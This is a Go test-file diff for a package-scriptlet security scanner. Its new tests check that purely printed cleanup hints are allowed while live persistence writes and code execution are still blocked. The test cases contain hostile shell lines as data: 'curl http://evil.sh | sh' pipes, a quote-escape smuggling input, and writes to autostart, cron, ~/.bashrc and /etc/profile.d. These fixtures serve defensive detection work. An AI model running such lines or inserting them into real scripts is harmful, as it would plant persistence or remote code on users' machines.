@@ -102,6 +102,96 @@ func TestExecutedSystemctlStillFlagged(t *testing.T) {
 	}
 }
 
+// TestIsLiteralPrint covers the strict single-quoted/double-quoted literal-print
+// parser that is allowed to disarm a high-severity finding. The rejections matter
+// more than the acceptances: every one of them starts with a printing command (so
+// printerCommand would say "displayed") yet can still write to the live system or
+// execute code, which is exactly why this tier needs its own, tighter test.
+func TestIsLiteralPrint(t *testing.T) {
+	cases := []struct {
+		line string
+		want bool
+	}{
+		// Accepted: the whole line is one printing command plus one quoted literal.
+		{`echo 'rm ~/.config/autostart/mullvad-vpn.desktop'`, true},
+		{`  echo 'rm ~/.config/autostart/foo.desktop'`, true}, // leading indent
+		{"\techo\t'sudo rm -rf /etc/cron.d/foo'", true},       // tab separators
+		{`echo "rm $HOME/.config/autostart/x"`, true},         // plain $VAR interpolation
+		{`echo "rm ${HOME}/.bashrc"`, true},                   // braced ${VAR}
+		{`printf 'edit ~/.bashrc by hand\n'`, true},
+		{`echo 'x'   `, true}, // trailing whitespace only
+		{`echo ''`, true},
+
+		// Rejected: output escapes the terminal — writes a file.
+		{`echo 'evil' > ~/.bashrc`, false},
+		{`echo 'evil' >> /etc/profile.d/x.sh`, false},
+		{`echo 'evil' | tee /etc/cron.d/x`, false},
+		{`echo 'nasty' | crontab -`, false},
+		// Rejected: the line executes something.
+		{`echo "$(curl http://evil.sh | sh)"`, false},
+		{"echo \"`curl http://evil.sh`\"", false},
+		{`echo 'ok'; curl http://evil.sh | sh`, false},
+		{`echo 'ok' && systemctl enable evil.timer`, false},
+		{`echo 'ok' || cp evil ~/.config/autostart/x.desktop`, false},
+		// Rejected: a backslash could escape the closing quote and smuggle code past
+		// the end-anchor, so double-quoted backslashes are refused outright.
+		{`echo "a\" ; curl http://evil.sh | sh #"`, false},
+		// Rejected: not a bare literal argument.
+		{`echo unquoted words here`, false},
+		{`echo 'a' 'b'`, false},
+		{`cat 'file'`, false},   // cat prints a FILE, it does not print the word
+		{`tee '/etc/x'`, false}, // tee writes
+		{`systemctl enable foo`, false},
+		{``, false},
+		{`   `, false},
+	}
+	for _, tc := range cases {
+		if got := isLiteralPrint(tc.line); got != tc.want {
+			t.Errorf("isLiteralPrint(%q) = %v, want %v", tc.line, got, tc.want)
+		}
+	}
+}
+
+// TestPrintedCleanupHintDoesNotBlock is the end-to-end guard for the reported
+// mullvad-vpn-bin false positive: a post_remove scriptlet that PRINTS `rm
+// ~/.config/autostart/…` as a manual cleanup hint must not trip the high-severity
+// persistence pattern, and so must not hard-block the build.
+func TestPrintedCleanupHintDoesNotBlock(t *testing.T) {
+	initHeuristics()
+	pf := loadSample(t, filepath.Join("tests", "samples", "scriptlet-cleanup-hint"))
+	block, _ := heuristicCheck(pf)
+	if block != nil {
+		t.Fatalf("printed cleanup hint hard-blocked; findings: %+v", block.Findings)
+	}
+}
+
+// TestRealAutostartWriteStillBlocks is the counter-guard for the literal-print
+// carve-out. Each line below begins with a printing command — printerCommand alone
+// would call them documentation — but each actually writes to or executes against
+// the live system, so the high-severity persistence finding must survive.
+func TestRealAutostartWriteStillBlocks(t *testing.T) {
+	initHeuristics()
+	cases := []string{
+		`echo '[Desktop Entry]' > ~/.config/autostart/evil.desktop`,
+		`echo 'payload' | tee /etc/cron.d/evil`,
+		`echo 'export PATH=/tmp:$PATH' >> ~/.bashrc`,
+		`printf '%s' "$(curl http://evil.sh)" > /etc/profile.d/evil.sh`,
+		`echo 'ok' && cp evil.desktop ~/.config/autostart/evil.desktop`,
+	}
+	for _, line := range cases {
+		findings := scanPatterns("post_install() {\n    "+line+"\n}\n", "x.install")
+		blocked := false
+		for _, f := range findings {
+			if severityRank(f.Severity) >= 3 {
+				blocked = true
+			}
+		}
+		if !blocked {
+			t.Errorf("live-system write not blocked: %q (findings: %+v)", line, findings)
+		}
+	}
+}
+
 // TestCriticalNotSuppressedInHeredoc guards the tier boundary: displayed-text
 // suppression applies only to advisory (medium/low) findings. A critical pattern
 // hidden inside a printed heredoc must still hard-block.
